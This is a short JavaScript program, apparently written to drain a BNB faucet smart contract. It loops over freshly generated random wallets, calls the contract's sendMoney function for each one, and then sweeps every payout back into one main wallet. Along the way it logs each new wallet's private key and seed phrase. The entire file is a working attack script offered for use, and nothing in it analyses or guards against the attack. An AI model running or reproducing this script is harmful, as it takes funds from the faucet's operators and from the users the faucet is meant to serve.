const ethers = require("ethers");
const config = require('./config.json');
require('./hack_config');

const provider = new ethers.providers.JsonRpcProvider(config.node);
const mainWallet = new ethers.Wallet(config.privateKey, provider);
const contractToAttac = new ethers.Contract(contractAddress, faucet_bnb_abi, mainWallet);

// Number of contract passes
const MaxCount = 10;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function getWalletBalance(address) {
    const result = await provider.getBalance(address);
    return {
        value: result,
        ethValue: ethers.utils.formatEther(result),
    }
}

async function sendAllEthToWallet(privateKeyFrom, toAddress) {
    const walletFrom = new ethers.Wallet(privateKeyFrom, provider);
    let balance = (await getWalletBalance(walletFrom.address)).value;
    const gasPrice = await provider.getGasPrice();
    const gasLimit = await provider.estimateGas({
        from: walletFrom.address,
        to: toAddress,
        value: balance,
      });
    let val = balance.sub(gasLimit.mul(gasPrice));

    let non = 5;
    while (non-- > 0 && val.isNegative()) {
        await sleep(3000);
        balance = (await getWalletBalance(walletFrom.address)).value;
        val = balance.sub(gasLimit.mul(gasPrice));
    }
    if (val.isNegative()) {
        return {
            result: false,
            address: walletFrom.address,
            message: `Error, balance is insufficient`,
        };
    } else {
        const tx = {
            to: toAddress,
            value: val,
            gasLimit: gasLimit,
        }
        const txObj = await walletFrom.sendTransaction(tx);
        return {
            result: true,
            address: walletFrom.address,
            message: `Transaction sent, txHash: ${txObj.hash}`,
        };
    }
}

async function main(_maxCount) {
    // const someWalletKey = "0x0";
    // await sendAllEthToWallet(someWalletKey, mainWallet.address).then((value) => {
    //     console.log(`SendAllEthToWallet from ${value.address}\nmessage: ${value.message}\n===`);
    // });

    let maxCount = _maxCount;
    while(maxCount-- > 0) {
        let nWallet = ethers.Wallet.createRandom();
        do {            
            const isGoodWallet = true; // nWallet.address.toString().toLowerCase().includes('0xc0de'.toLowerCase());
            if (isGoodWallet) {
                console.log(`===\nAddress: ${nWallet.address}\nPrivateKey: ${nWallet.privateKey}\nPhrase: ${nWallet.mnemonic.phrase}\n===`);
                break;
            }
            nWallet = ethers.Wallet.createRandom();
        } while(true);

        const gasLimit = await contractToAttac.estimateGas.sendMoney(nWallet.address);
        await contractToAttac.sendMoney( nWallet.address, { gasLimit: gasLimit } );
        const value = await sendAllEthToWallet(nWallet.privateKey, mainWallet.address);
        console.log(`SendAllEthToWallet from ${value.address}\nmessage: ${value.message}\n===`);
        if (!value.result) {
            console.log("=================== || ===================");
        }
    }
}

main(MaxCount).then(async () => {
    console.log("===================");
});